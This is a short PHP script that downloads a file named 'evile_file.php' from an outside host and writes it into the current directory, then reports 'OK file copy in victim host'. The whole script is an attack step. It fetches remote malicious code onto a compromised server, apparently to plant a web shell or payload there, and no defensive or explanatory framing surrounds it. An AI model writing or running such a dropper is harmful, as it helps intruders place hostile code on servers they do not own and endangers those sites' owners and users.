<?php
$file = 'http://sample.com/evile_file.php';
$newfile = 'evile_file.php';
if (!copy($file, $newfile)) {
   echo "failed to copy $file...\n";
}else{
   echo "OK file copy in victim host";
}
